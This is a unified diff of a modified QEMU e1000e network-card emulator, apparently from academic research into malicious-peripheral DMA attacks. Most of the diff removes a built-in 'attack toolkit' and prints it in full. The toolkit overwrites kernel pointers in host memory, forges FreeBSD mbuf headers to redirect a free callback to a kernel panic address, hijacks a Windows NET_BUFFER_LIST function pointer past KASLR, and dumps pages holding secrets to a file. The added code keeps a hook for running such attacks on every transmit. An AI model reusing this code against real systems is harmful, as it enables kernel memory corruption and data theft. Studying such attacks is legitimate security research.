@@ -32,15 +32,11 @@
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, see <http://www.gnu.org/licenses/>.
 */
-#include <sys/queue.h>
-#include <time.h>
-
-#include "crhexdump.h"
+#include "attacks.h"
 #include "pcie.h"
 #include "pcie-debug.h"
 #include "log.h"
 #include "mask.h"
-#include "secret_position.h"
 
 #include "hw/hw.h"
 #include "hw/pci/pci.h"
@@ -60,39 +56,24 @@
 
 #include "trace.h"
 
-/* This has to come last because of macOS's bloody stupid approach to mbuf
- * members
+/*
+ * Some support for the attack toolkit, by cr437@cam.ac.uk
  */
 
-#ifndef POSTGRES
-#ifdef VICTIM_MACOS
-#include "macos-stub-mbuf.h"
-#include "macos-mbuf-manipulation.h"
-#else
-#include <sys/param.h>
-#include <sys/mbuf.h>
-#endif
-#endif
+static OperateOnDescriptor _PRE_XMIT_HOOK;
+static void (*_PRE_XMIT_HOOK_DONE)();
+
+void
+register_pre_xmit_hook(OperateOnDescriptor loop_body, void (*done)())
+{
+	_PRE_XMIT_HOOK = loop_body;
+	_PRE_XMIT_HOOK_DONE = done;
+}
 
 /*
- * Attack tool kit types
- * ---------------------------------------------------------------------------
+ * -------------------------------------------------------
  */
-extern FILE *GLOBAL_BINARY_FILE;
-bool tracking_window;
 
-void attempt_to_subvert_windows(E1000ECore* core, hwaddr ba);
-void attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba);
-void print_rx_buffer_address_information(E1000ECore *core);
-void print_tx_buffer_address_information(E1000ECore *core);
-void record_tx_windows_from_tx_buffer(E1000ECore *core);
-void find_secret_window_to_track(E1000ECore *core);
-void record_tx_windows(E1000ECore *core);
-void mangle_pointers_on_tx_visible_pages(E1000ECore *core);
-
-/*
- * ----------------------------------------------------------------------------
- */
 
 #define _E1000E_MIN_XITR (500) /* No more then 7813 interrupts per
                                   second according to spec 10.2.4.2 */
@@ -1012,9 +993,6 @@ _e1000e_rx_ring_init(E1000ECore *core, E1000E_RxRing *rxr, int idx)
 static void
 start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
 {
-	/*putchar('t');*/
-	/*fflush(stdout);*/
-
     dma_addr_t base;
     struct e1000_tx_desc desc;
     bool ide = false;
@@ -1026,21 +1004,10 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
         return;
     }
 
-	mangle_pointers_on_tx_visible_pages(core);
-
-#if 0
-	if (!tracking_window) {
-		find_secret_window_to_track(core);
+	if (_PRE_XMIT_HOOK != NULL) {
+		for_each_descriptor_address(core, DT_TRANSMIT, _PRE_XMIT_HOOK,
+			_PRE_XMIT_HOOK_DONE);
 	}
-
-	if (tracking_window) {
-		/* If we now manage to find a window to track, point blank refuse to
-		 * send any more packets, in order to force the host to keep some
-		 * windows open.
-		 */
-		return;
-	}
-#endif
 
     while (!_e1000e_ring_empty(core, txi)) {
         base = _e1000e_ring_head_descr(core, txi);
@@ -1052,10 +1019,6 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
 
         process_tx_desc(core, txr->tx, &desc, txi->idx);
         cause |= txdesc_writeback(core, base, &desc, &ide, txi->idx);
-
-		/*uint64_t buffer_addr = le64_to_cpu(desc.buffer_addr);*/
-		/*attempt_to_subvert_mbuf(core, buffer_addr);*/
-		/*attempt_to_subvert_windows(core, buffer_addr);*/
 
         _e1000e_ring_advance(core, txi, 1);
     }
@@ -3586,714 +3549,60 @@ e1000e_core_post_load(E1000ECore *core)
     return 0;
 }
 
-
 /*
- * ----------------------------------------------
- *
- *  Attack toolkit starts here.
- *
- *  These live here, because they need to use e1000e internals aware features
- *  quite intimately in order to work well.
- *
- *  By cr437@cam.ac.uk
- *
- *  ---------------------------------------------
+ * This is exported to be used by the external attack file.
  */
-#ifndef POSTGRES
 void
-print_mbuf_flags(int mbuf_flags_field)
+for_each_descriptor_address(E1000ECore *core, enum DescriptorType which_ring,
+	OperateOnDescriptor loop_body, void (*done)())
 {
-#ifdef VICTIM_MACOS
-#else
-	static const int flag_count = 22;
-	static const int flags[flag_count] = {
-		M_EXT,
-		M_PKTHDR,
-		M_EOR,
-		M_RDONLY,
-		M_BCAST,
-		M_MCAST,
-		M_PROMISC,
-		M_VLANTAG,
-		M_UNUSED_8,
-		M_NOFREE,
-		M_PROTO1,
-		M_PROTO2,
-		M_PROTO3,
-		M_PROTO4,
-		M_PROTO5,
-		M_PROTO6,
-		M_PROTO7,
-		M_PROTO8,
-		M_PROTO9,
-		M_PROTO10,
-		M_PROTO11,
-		M_PROTO12
-	};
+	struct Descriptor descriptor;
+	struct e1000_tx_desc tx_desc;
+    uint8_t rx_desc[E1000_MAX_RX_DESC_LEN];
+    hwaddr rx_ba[MAX_PS_BUFFERS]; /* Buffer addresses */
 
-#define CASE(flag)														\
-case flag:																\
-	printf( #flag " ");													\
-	break
+	const E1000E_RingInfo *ri;
 
-	for (int i = 0; i < flag_count; ++i) {
-		switch (mbuf_flags_field & flags[i]) {
-			CASE(M_EXT);
-			CASE(M_PKTHDR);
-			CASE(M_EOR);
-			CASE(M_RDONLY);
-			CASE(M_BCAST);
-			CASE(M_MCAST);
-			CASE(M_PROMISC);
-			CASE(M_VLANTAG);
-			CASE(M_UNUSED_8);
-			CASE(M_NOFREE);
-			CASE(M_PROTO1);
-			CASE(M_PROTO2);
-			CASE(M_PROTO3);
-			CASE(M_PROTO4);
-			CASE(M_PROTO5);
-			CASE(M_PROTO6);
-			CASE(M_PROTO7);
-			CASE(M_PROTO8);
-			CASE(M_PROTO9);
-			CASE(M_PROTO10);
-			CASE(M_PROTO11);
-			CASE(M_PROTO12);
-		}
-	}
-
-#undef CASE
-#endif /* def VICTIM_MACOS */
-}
-
-inline uint32_t
-bswap24(uint32_t x)
-{
-	return ((x & 0xFF0000) >> 16) | (x & 0x00FF00) | ((x & 0x0000FF) << 16);
-}
-
-#ifndef VICTIM_MACOS
-void
-endianness_swap_freebsd_mbuf_header(struct mbuf *mbuf)
-{
-#define FIX_32_FIELD(field)	field = (typeof(field))le32_to_cpu((int32_t)field)
-#define FIX_64_FIELD(field)	field = (typeof(field))le64_to_cpu((int64_t)field)
-
-	FIX_64_FIELD(mbuf->m_next);
-	FIX_64_FIELD(mbuf->m_nextpkt);
-	FIX_64_FIELD(mbuf->m_data);
-	FIX_32_FIELD(mbuf->m_len);
-	mbuf->m_flags = bswap24(mbuf->m_flags);
-	FIX_64_FIELD(mbuf->m_ext.ext_cnt);
-	FIX_64_FIELD(mbuf->m_ext.ext_buf);
-	FIX_32_FIELD(mbuf->m_ext.ext_size);
-	mbuf->m_ext.ext_flags = bswap24(mbuf->m_ext.ext_flags);
-	FIX_64_FIELD(mbuf->m_ext.ext_free);
-	FIX_64_FIELD(mbuf->m_ext.ext_arg1);
-	FIX_64_FIELD(mbuf->m_ext.ext_arg2);
-
-#undef FIX_32_FIELD
-#undef FIX_64_FIELD
-}
-
-void
-print_freebsd_mbuf_information(const struct mbuf *mbuf)
-{
-	printf("m_next: %p.\n", mbuf->m_next);
-	printf("m_nextpkt: %p.\n", mbuf->m_nextpkt);
-	printf("m_data: %p.\n", mbuf->m_data);
-	printf("m_len: %d.\n", mbuf->m_len);
-	printf("m_type: 0x%x\n", mbuf->m_type);
-	printf("m_flags: 0x%x (", mbuf->m_flags);
-	print_mbuf_flags(mbuf->m_flags);
-	puts(")");
-}
-#endif
-
-typedef hwaddr (*get_buffer_address_fp)(E1000ECore *, dma_addr_t);
-
-hwaddr
-get_buffer_address_from_rx_descriptor(E1000ECore *core,
-	dma_addr_t rx_descriptor_addr)
-{
-    uint8_t desc[E1000_MAX_RX_DESC_LEN];
-    hwaddr ba[MAX_PS_BUFFERS]; /* Buffer addresses */
-	WARN_ON_CHEW(pci_dma_read(core->owner, rx_descriptor_addr, &desc, core->rx_desc_len));
-	read_rx_descriptor(core, desc, &ba);
-	return ba[0];
-}
-
-hwaddr
-get_buffer_address_from_tx_descriptor(E1000ECore *core,
-	dma_addr_t descriptor_addr)
-{
-	struct e1000_tx_desc desc;
-	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
-	return le64_to_cpu(desc.buffer_addr);
-}
-
-void
-print_buffer_address_information(E1000ECore *core,
-	dma_addr_t descriptor_addr, void *opaque)
-{
-	struct mbuf mbuf_buffer;
-
-	get_buffer_address_fp get_buffer_address = (get_buffer_address_fp)(opaque);
-	hwaddr ba = get_buffer_address(core, descriptor_addr);
-
-	printf("Buffer: 0x%lx.", ba);
-	if (ba % 2048 == 0) {
-		puts("Address is 2K aligned. Probably cluster. ");
-	} else {
-		putchar('\n');
-		pci_dma_read(core->owner, ba & ~0xFF, (uint8_t *)(&mbuf_buffer),
-			sizeof(struct mbuf));
-#ifdef VICTIM_MACOS
-		endianness_swap_mac_mbuf_header(&mbuf_buffer);
-		print_macos_mbuf_header(&mbuf_buffer);
-#else
-		endianness_swap_freebsd_mbuf_header(&mbuf_buffer);
-		print_freebsd_mbuf_information(&mbuf_buffer);
-#endif
-	}
-	/*hexdump((uint8_t *)(&mbuf_buffer), 256);*/
-}
-
-struct window {
-	uint64_t base;
-	uint64_t length;
-	uint64_t checksum;
-};
-
-struct window tracked_window;
-
-static inline void
-print_window(const struct window * const entry)
-{
-	printf("window 0x%lx (%ld bytes)", entry->base, entry->length);
-}
-
-/*#ifdef USE_WINDOW_LIST*/
-#if 1
-int window_list_length, window_list_min_length, window_list_max_length;
-
-/* This could be done with better performance with an SLIST, but this requires
- * a really unpleasantly complicated system for iterating through the loop
- * while potentially removing elements (repeatedly checking the head in case
- * you delete it, and you need a new head, and then checking the 'next'
- * elemeent constantly, so you still have the handle to the 'current' element
- * to remove afterwards. I used to do this, but then I basically had to write
- * the code again, and couldn't think of a good abstraction.
- *
- * XXX cr437: I have been quite stupid here. There is equally the macro
- * SLIST_FOREACH_SAFE.
- */
-
-LIST_HEAD(window_list_head, window_list_entry) window_list_head
-	= LIST_HEAD_INITIALIZER(window_list_head);
-
-
-struct window_list_entry {
-	struct window window;
-	LIST_ENTRY(window_list_entry) window_list;
-};
-
-clock_t start_time;
-
-/* I don't like using the constructor attribute, but it's the simplest way to
- * go about this.
- */
-__attribute__((constructor))
-void
-initialise_window_list()
-{
-	printf("INIT PAGE LIST\n");
-	LIST_INIT(&window_list_head);
-	window_list_length = 0;
-	window_list_min_length = 0;
-	window_list_max_length = 0;
-	start_time = clock();
-	tracking_window = false;
-}
-
-static inline void
-adjust_window_list_length(int diff)
-{
-	window_list_length += diff;
-	/*printf("%d ", window_list_length);*/
-	/*fflush(stdout);*/
-	/*if (window_list_length > window_list_max_length) {*/
-		/*window_list_max_length = window_list_length;*/
-		/*printf("Window list new max length: %d.\n", window_list_length);*/
-	/*} else if (window_list_length < window_list_min_length) {*/
-		/*window_list_min_length = window_list_length;*/
-		/*printf("Window list new min length: %d.\n", window_list_length);*/
-	/*}*/
-}
-
-bool
-window_in_list(struct window window)
-{
-	struct window_list_entry *window_list_entry;
-	LIST_FOREACH(window_list_entry, &window_list_head, window_list) {
-		if (window.base == window_list_entry->window.base &&
-			window.length == window_list_entry->window.length) {
-			return true;
-		}
-	}
-	return false;
-}
-
-void
-check_windows_for_secret(E1000ECore *core)
-{
-	assert(false); /* XXX THIS USES FUNCTIONS THAT ARE BITROTTED FOR EXPERIMENT */
-	int read_result;
-	uint8_t page[4096];
-	struct window_list_entry *entry, *temp;
-
-	if ((clock() - start_time) < 20000) {
-		/*printf("%d\n", window_list_length);*/
-		return;
-	}
-
-	/*putchar('c'); fflush(stdout);*/
-
-	LIST_FOREACH_SAFE(entry, &window_list_head, window_list, temp) {
-		read_result = perform_dma_long_read(page, entry->window.length,
-			core->owner->devfn, 8, entry->window.base);
-		if (read_result == DRR_SUCCESS) {
-			/*check_for_secret(&(entry->window), page);*/
-		} else {
-			LIST_REMOVE(entry, window_list);
-			free(entry);
-			adjust_window_list_length(-1);
-		}
-	}
-}
-
-uint64_t
-checksum_window(uint8_t page[4096])
-{
-	uint64_t sum = 0;
-	uint64_t *page_as_uint64 = (uint64_t *)page;
-	for (int i = 0; i < (4096 / sizeof(uint64_t)); ++i) {
-		sum += page_as_uint64[i];
-	}
-	return sum;
-}
-
-void
-mangle_kernel_pointers(E1000ECore *core, dma_addr_t descriptor_addr,
-	void *opaque)
-{
-	int read_result;
-	uint64_t page_address, kernel_pointer_address;
-	struct e1000_tx_desc desc;
-	uint8_t page[4096];
-	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
-	page_address = page_base_address(le64_to_cpu(desc.buffer_addr));
-
-	if (page_address == 0) {
-		return;
-	}
-
-	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
-		page_address);
-
-	uint64_t little_buffer, deadbeef = cpu_to_le64(0xDEADBEEFBEDEDEAD);
-
-	int kernel_pointer_location = -4;
-
-	if (read_result == DRR_SUCCESS) {
-		while (true) {
-			kernel_pointer_location = secret_position(page,
-				kernel_pointer_location + 4, 0xFF, 4);
-			if (kernel_pointer_location == -1) {
-				break;
-			} else {
-				kernel_pointer_address = page_address | kernel_pointer_location;
-				/*putchar('m');*/
-				/*fflush(stdout);*/
-				printf("kp 0x%lx.\n", kernel_pointer_address);
-				perform_dma_write((uint8_t *)&deadbeef, sizeof(deadbeef),
-					core->owner->devfn, 8, kernel_pointer_address);
-				perform_dma_read((uint8_t *)&little_buffer,
-					sizeof(little_buffer), core->owner->devfn, 8,
-					kernel_pointer_address);
-				if (little_buffer != deadbeef) {
-					printf("Wrote 0x%lx to 0x%lx, but read 0x%lx.\n",
-						kernel_pointer_address, deadbeef, little_buffer);
-				}
-			}
-		}
-	} else {
-		putchar('e');
-		printf("pa 0x%lx.\n", page_address);
-		fflush(stdout);
-	}
-}
-
-void
-record_tx_windows_from_descriptor_address(E1000ECore *core,
-	dma_addr_t descriptor_addr, void *opaque)
-{
-	/*putchar('w');*/
-	/*fflush(stdout);*/
-	struct window_list_entry *entry, *temp;
-
-	struct e1000_tx_desc desc;
-	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
-
-	struct window window;
-	window.base = le64_to_cpu(desc.buffer_addr);
-	window.length = le16_to_cpu(desc.lower.flags.length);
-
-	uint64_t window_page_base_address = page_base_address(window.base);
-
-	/* XXX: WINDOW TRACKING */
-	window.base = window_page_base_address;
-	window.length = 4096;
-
-	/*LIST_FOREACH_SAFE(entry, &window_list_head, window_list, temp) {*/
-		/*if (page_base_address(entry->window.base) == window_page_base_address) {*/
-			/*LIST_REMOVE(entry, window_list);*/
-			/*adjust_window_list_length(-1);*/
-			/*free(entry);*/
-		/*}*/
-	/*}*/
-
-	/*entry = malloc(sizeof(struct window_list_entry));*/
-	/*entry->window = window;*/
-	/*LIST_INSERT_HEAD(&window_list_head, entry, window_list);*/
-	/*adjust_window_list_length(1);*/
-
-	int read_result;
-	uint8_t page[4096];
-
-	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
-		window_page_base_address);
-
-	if (read_result == DRR_SUCCESS) {
-		if (secret_position(page, 0, 'i', 8) != -1) {
-			putchar('s');
-			fflush(stdout);
-			tracking_window = true;
-			window.checksum = checksum_window(page);
-			tracked_window = window;
-			fwrite(page, 1, 4096, GLOBAL_BINARY_FILE);
-		}
-	} else {
-		printf("Couldn't read page! Weird :(.\n");
-	}
-}
-
-void
-write_window_if_changed(E1000ECore *core)
-{
-	int read_result;
-	uint8_t page[4096];
-	uint64_t new_checksum;
-
-	if (!tracking_window) {
-		return;
-	}
-
-	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
-		tracked_window.base);
-
-	if (read_result == DRR_SUCCESS) {
-		new_checksum = checksum_window(page);
-		if (new_checksum != tracked_window.checksum) {
-			tracked_window.checksum = new_checksum;
-			fwrite(page, 1, 4096, GLOBAL_BINARY_FILE);
-			putchar('c');
-			fflush(stdout);
-		}
-	} else {
-		putchar('E');
-		fflush(stdout);
-		tracking_window = false;
-	}
-}
-#endif
-
-#if 0
-struct window the_window;
-bool the_window_in_use = false;
-
-void
-check_windows_for_secret(E1000ECore *core)
-{
-	uint8_t page[4096];
-
-
-void
-record_tx_windows_from_descriptor_address(E1000ECore *core,
-	dma_addr_t descriptor_addr, void *opaque)
-{
-	struct e1000_tx_desc desc;
-	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
-
-	hwaddr base = le64_to_cpu(desc.buffer_addr);
-	hwaddr length = le16_to_cpu(desc.lower.flags.length);
-
-	if (the_window_in_use) {
-		putchar('f');
-		fflush(stdout);
-	}
-
-	the_window_in_use = true;
-	the_window.base = base;
-	the_window.length = length;
-
-	check_windows_for_secret(core);
-}
-#endif
-
-const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
-const void *KERNEL_PANIC_ADDR =		(void *)0xffffffff80a0b9a0ll;
-
-void
-attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba)
-{
-#ifdef VICTIM_FREEBSD
-	char buffer[256];
-	struct mbuf *mbuf = (struct mbuf *)(buffer);
-	char *data_buffer = (buffer + sizeof(struct mbuf));
-
-	PDBG("Attempting to subvert buffer with address 0x%lx.", ba);
-
-	if ((ba % 2048) == 0) {
-		PDBG("Buffer is probably a cluster.");
-		return; /* Probably a cluster */
-	}
-
-
-	pci_dma_read(core->owner, ba & ~0xFF, mbuf, sizeof(struct mbuf));
-	endianness_swap_freebsd_mbuf_header(mbuf);
-
-	uint64_t kernel_mbuf_addr = (uint64_t)mbuf->m_data & ~0xFF;
-	PDBG("Kernel's address for mbuf: 0x%lx.", kernel_mbuf_addr);
-
-	/*
-	 * In order for the free function to be called, the mbuf needs to have a
-	 * non-null, non-zero pointer as a reference count. We are guaranteed 120
-	 * bytes of space in the mbuf after its header, so we write there.
-	 */
-
-	uint32_t *ext_cnt = (uint32_t *)data_buffer;
-	*ext_cnt = bswap32(1);
-
-	/*
-	 * If it attempts to free the mbuf, it gets into alignemnt issues.
-	 */
-	mbuf->m_flags |= M_EXT | M_NOFREE;
-	mbuf->m_ext.ext_type = EXT_EXTREF;
-	mbuf->m_ext.ext_cnt = (u_int *)(kernel_mbuf_addr + sizeof(struct mbuf));
-	mbuf->m_ext.ext_free = KERNEL_PANIC_ADDR;
-	/* m_next is the value given as the first argument of the called function.
-	 */
-	mbuf->m_next = (struct mbuf *)(kernel_mbuf_addr + sizeof(struct mbuf) + 8);
-
-	endianness_swap_freebsd_mbuf_header(mbuf);
-
-	/*
-	 * Have to write this after the conversion, because it collides with mbuf
-	 * fields, and doesn't want to be swapped about.
-	 */
-
-	buffer[0] = 'B';
-	buffer[1] = 'A';
-	buffer[2] = 'D';
-	buffer[3] = ' ';
-	buffer[4] = 'N';
-	buffer[5] = 'I';
-	buffer[6] = 'C';
-	buffer[7] = '!';
-	buffer[8] = '\n';
-	buffer[9] = 0;
-
-	PDBG("DMA writing to addr %lx", ba & ~0xFF);
-	pci_dma_write(core->owner, ba & ~0xFF, buffer, 256);
-#endif
-}
-
-static inline hwaddr
-page_addr(hwaddr addr)
-{
-	return addr & ~((1LL << 12) - 1);
-}
-
-void
-print_page(E1000ECore* core, hwaddr ba)
-{
-	const int ROW_SIZE = 16;
-	hwaddr print_addr, page_base, page_limit;
-	page_base = page_addr(ba);
-	page_limit = page_addr(ba + 4096);
-	printf("Printing page containg addr 0x%lx (0x%lx -> 0x%lx).\n", ba,
-		page_base, page_limit);
-	uint8_t buffer[ROW_SIZE];
-
-	for (print_addr = page_base; print_addr < page_limit;
-		print_addr += ROW_SIZE)
-	{
-		pci_dma_read(core->owner, print_addr, &buffer, ROW_SIZE);
-
-		printf("0x%0lx   ", print_addr);
-
-		for (int i = 0; i < ROW_SIZE; ++i) {
-			printf("%02x ", buffer[i]);
-
-			if (((i + 1) % 4) == 0) {
-				putchar(' ');
-			}
-			if (((i + 1) % 8) == 0) {
-				putchar(' ');
-			}
-		}
-
-		putchar('\n');
-
-		for (int j = 0; j < 1024; ++j) {
-			asm("nop");
-		}
-	}
-}
-
-void
-attempt_to_subvert_windows(E1000ECore* core, hwaddr ba)
-{
-	/* Emprically detirmined by atm26:
-	 * - NET_BUFFER_LIST at ffffb08618300030
-	 * - function pointer at +0x50
-	 * - signature of 0x422005b4 at +0xa0
-	 * - NET_BUFFER at ffffb086183001a0
-	 * - MDL at ffffb08618300270 (54 byte payload buffer with Ethernet headers)
-	 * - MDL at ffffb08615c032f0 (64240 byte payload buffer of Jumbo frame)
-	 * 0xffffb08618300030
-	 * 0xffffb08618300270
-	 */
-	const hwaddr NET_BUFFER_LIST_OFFSET =
-		0xffffb08618300270LL - 0xffffb08618300030LL;
-	const hwaddr SIGNATURE_OFFSET = 0xa0;
-	const uint64_t EXPECTED_SIGNATURE = 0x422005b4;
-	const uint64_t FP_OFFSET = 0x50;
-	const uint64_t EXPECTED_SEND_FP = -1;
-	const uint64_t WINDOWS_PAGE_MASK = (1LL << 13) - 1;
-	const uint64_t NEW_FP_BASE = -1;
-
-	hwaddr net_buffer_list_addr = ba - NET_BUFFER_LIST_OFFSET;
-	hwaddr signature_addr = net_buffer_list_addr + SIGNATURE_OFFSET;
-
-	uint64_t signature;
-	pci_dma_read(core->owner, signature_addr, &signature, 8);
-	signature = le64_to_cpu(signature);
-
-	if (signature != EXPECTED_SIGNATURE) {
-		printf("Signature was: 0x%lx, but expected 0x%lx. Ignoring buffer.\n",
-			signature, EXPECTED_SIGNATURE);
-		return;
-	}
-
-	hwaddr fp_addr = net_buffer_list_addr + FP_OFFSET;
-	hwaddr kaslr_slide;
-
-	uint64_t fp;
-	pci_dma_read(core->owner, fp_addr, &fp, 8);
-	fp = le64_to_cpu(signature);
-
-	if ((fp & WINDOWS_PAGE_MASK) != (EXPECTED_SEND_FP & WINDOWS_PAGE_MASK)) {
-		printf("FP 0x%lx has different page offset from 0x%lx. "
-			"Ignoring buffer.\n",
-			fp, EXPECTED_SEND_FP);
-		return;
-	}
-
-	kaslr_slide = fp - EXPECTED_SEND_FP;
-	uint64_t new_fp = NEW_FP_BASE + kaslr_slide;
-	new_fp = cpu_to_le64(fp);
-
-	pci_dma_write(core->owner, fp_addr, &new_fp, 8);
-}
-
-void
-for_each_descriptor_address(E1000ECore *core, const E1000E_RingInfo *rxi,
-	void (*loop_body)(E1000ECore *core, dma_addr_t, void *),
-	void (*done)(void *),
-	void *opaque)
-{
     dma_addr_t cursor_addr, tail_addr, wrap_addr;
 
-	cursor_addr = _e1000e_ring_head_descr(core, rxi);
-	tail_addr = _e1000e_ring_tail_descr(core, rxi);
-	wrap_addr = _e1000e_ring_descriptor_address(core, rxi,
-		core->mac[rxi->dlen]);
+	if (which_ring == DT_TRANSMIT) {
+		E1000E_TxRing txr;
+		_e1000e_tx_ring_init(core, &txr, 0);
+		ri = txr.i;
+	} else if (which_ring == DT_RECEIVE) {
+		E1000E_RxRing rxr;
+		_e1000e_rx_ring_init(core, &rxr, 0);
+		ri = rxr.i;
+	} else {
+		assert(false);
+	}
+	descriptor.type = which_ring;
+
+	cursor_addr = _e1000e_ring_head_descr(core, ri);
+	tail_addr = _e1000e_ring_tail_descr(core, ri);
+	wrap_addr = _e1000e_ring_descriptor_address(core, ri,
+		core->mac[ri->dlen]);
 
 	while (cursor_addr != tail_addr) {
-		loop_body(core, cursor_addr, opaque);
+		if (which_ring == DT_TRANSMIT) {
+			pci_dma_read(core->owner, cursor_addr, &tx_desc, sizeof(tx_desc));
+			descriptor.buffer_addr = le64_to_cpu(tx_desc.buffer_addr);
+			descriptor.length = le16_to_cpu(tx_desc.lower.flags.length);
+		} else { /* which_ring == DT_RECEIVE */
+			pci_dma_read(core->owner, cursor_addr, &rx_desc, core->rx_desc_len);
+			read_rx_descriptor(core, rx_desc, &rx_ba);
+			descriptor.buffer_addr = rx_ba[0];
+		}
+
+		loop_body(core, &descriptor);
 
 		cursor_addr += E1000_RING_DESC_LEN;
 		if (cursor_addr == wrap_addr) {
-			cursor_addr = _e1000e_ring_base(core, rxi);
+			cursor_addr = _e1000e_ring_base(core, ri);
 		}
 	}
 
 	if (done != NULL) {
-		done(opaque);
+		(*done)();
 	}
 }
-
-void
-print_rx_buffer_address_information(E1000ECore *core)
-{
-	/*printf("RX Buffer.\n");*/
-    E1000E_RxRing rxr;
-    const E1000E_RingInfo *rxi = rxr.i;
-
-	if (core->rx_desc_len == 0) {
-		PDBG("rx_desc_len not initialised, not doing anything.\n");
-		return;
-	}
-	/* 0 is the queue. Should do something with RSS to confirm this is
-	 * correct. */
-    _e1000e_rx_ring_init(core, &rxr, 0);
-	for_each_descriptor_address(core, rxi, print_buffer_address_information,
-		NULL, get_buffer_address_from_rx_descriptor);
-}
-
-void
-print_tx_buffer_address_information(E1000ECore *core)
-{
-	/*printf("TX Buffer.\n");*/
-	E1000E_TxRing txr;
-	const E1000E_RingInfo *txi = txr.i;
-	_e1000e_tx_ring_init(core, &txr, 0);
-	for_each_descriptor_address(core, txi, print_buffer_address_information,
-		NULL, get_buffer_address_from_tx_descriptor);
-}
-
-void
-find_secret_window_to_track(E1000ECore *core)
-{
-	/* XXX PREMATURE EXIT XXX */
-
-	E1000E_TxRing txr;
-	const E1000E_RingInfo *txi = txr.i;
-	_e1000e_tx_ring_init(core, &txr, 0);
-	for_each_descriptor_address(core, txi,
-		record_tx_windows_from_descriptor_address, NULL, NULL);
-	/*check_windows_for_secret(core);*/
-}
-
-void
-mangle_pointers_on_tx_visible_pages(E1000ECore *core)
-{
-	E1000E_TxRing txr;
-	const E1000E_RingInfo *txi = txr.i;
-	_e1000e_tx_ring_init(core, &txr, 0);
-	for_each_descriptor_address(core, txi, mangle_kernel_pointers, NULL, NULL);
-}
-#endif
